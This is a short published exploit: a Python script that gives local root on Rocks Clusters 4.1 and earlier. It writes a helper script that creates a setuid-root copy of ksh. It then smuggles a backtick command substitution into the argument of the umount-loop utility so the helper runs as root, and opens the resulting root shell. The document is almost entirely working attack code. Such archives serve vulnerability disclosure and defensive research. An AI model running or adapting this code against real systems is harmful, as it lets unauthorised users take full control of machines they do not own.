Rocks Clusters <= 4.1 (umount-loop) Local Root Exploit
======================================================


#!/usr/bin/env python
##############################################################################
##  rocksumountdirty.py: Rocks release <=4.1 local root exploit
##  quick and nasty version of the exploit. make sure the . is writable and
##  you clean up afterwards. ;)
##
##  coded by: xavier@tigerteam.se [http://xavsec.blogspot.com]
##############################################################################
x=__import__(&#039;os&#039;);c=x.getcwd()
open(&#039;%s/x&#039;%c, &#039;a&#039;).write("#!/bin/sh\ncp /bin/ksh %s/shell\nchmod a+xs %s/shell\nchown root.root %s/shell\n" % (c,c,c))
print "Rocks Clusters <=4.1 umount-loop local root exploit by xavier@tigerteam.se [http://xavsec.blogspot.com]"
x.system(&#039;umount-loop "\`sh %s/x\`"&#039;%c);x.system("%s/shell"%c)



